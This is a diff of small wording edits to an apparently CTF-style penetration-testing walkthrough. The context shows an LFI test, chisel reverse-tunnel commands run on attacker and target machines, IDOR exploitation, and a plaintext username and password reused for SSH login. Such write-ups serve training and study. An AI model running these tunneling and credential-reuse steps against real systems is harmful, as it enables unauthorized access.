@@ -171,7 +171,7 @@ Running this gave me this
 
 ![image](https://user-images.githubusercontent.com/67879936/224583384-6f030ae2-f1a7-4575-b34b-70601d489282.png)
 
-This kind of means we are probably sitting in the ```/tmp``` directory. Lets test this for possible LFI
+This means we are probably sitting in the ```/tmp``` directory. Lets test this for possible LFI
 
 
 
@@ -319,6 +319,7 @@ During my enumeration I found out that port 5555 is running on a webpage similar
 cool, now lets go ahead and run this toool.
 
 >command: chisel server -p 9001 --reverse (run this on your machine)
+
 >command: chisel client <ur ip>:9001 R:80:10.150.150.222:80 (run this on the target's machine)
 
 ![image](https://user-images.githubusercontent.com/67879936/224591076-c9446ace-b81c-4add-b619-d45e49c0600c.png)
@@ -335,7 +336,7 @@ cool, we'll repeat the same steps we did earlier during our enumeration. That is
 ![image](https://user-images.githubusercontent.com/67879936/224591510-15c56df4-9211-4bdd-8fa5-57b78644141c.png)
 ![image](https://user-images.githubusercontent.com/67879936/224591585-224085e9-58ab-4def-8122-21d31d59462a.png)
 
-The same IDOR vulnerability is also present in this webpage which made us had aceess to ```Edwards``` password. We'll try to login to the ssh server using this credentials
+The same IDOR vulnerability is also present on this webpage which made us had aceess to ```Edwards``` password. We'll try to login to the ssh server using this credentials
 
 ```username:edwards```      ```password:d07867c6267dcb5df0af```
 
